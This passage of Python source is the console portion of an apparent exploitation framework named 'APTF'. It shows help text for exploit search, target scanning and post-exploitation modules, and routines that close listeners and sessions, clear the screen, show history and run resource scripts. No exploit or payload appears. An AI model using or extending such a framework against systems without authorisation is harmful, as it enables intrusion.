        print(f"{'search <term>':<20} Search exploits")
        print(f"{'scan <target>':<20} Scan target")
        print(f"{'post <session_id> <module>':<20} Post-exploitation modules")
        print(f"{'clear':<20} Clear screen")
        print(f"{'history':<20} Show command history")
        print(f"{'exit':<20} Exit the framework")
        print("\nType 'help <command>' for more details\n")

    def _exit(self, *args):
        
        for listener in self.listeners:
            listener.stop()
        
        
        for session in self.sessions:
            session.close()
        
       
        self._save_history()
        
        print(f"{Colors.YELLOW}[*] Exiting APTF...{Colors.RESET}")
        sys.exit(0)

    def _clear(self, *args):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._print_banner()

    def _history(self, *args):
        print("\nCommand history:\n")
        for i in range(1, readline.get_current_history_length() + 1):
            print(f"{i}: {readline.get_history_item(i)}")
        print()

    def _resource(self, *args):
        if not args:
            print(f"{Colors.RED}[!] Usage: resource <path_to_script>{Colors.RESET}")
            return

        script_path = args[0]
        try:
            with open(script_path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        print(f"{Colors.YELLOW}[*] Executing: {line}{Colors.RESET}")
                        parts = shlex.split(line)
                        cmd = parts[0]
                        args = parts[1:] if len(parts) > 1 else []
                        
                        if cmd in self.commands:
                            self.commands[cmd](*args)
                        else:
                            print(f"{Colors.RED}[!] Unknown command in script: {cmd}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to execute script: {e}{Colors.RESET}")

if __name__ == "__main__":
    try:
        console = APTFConsole()
        console.start()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[*] Exiting...{Colors.RESET}")
        sys.exit(0)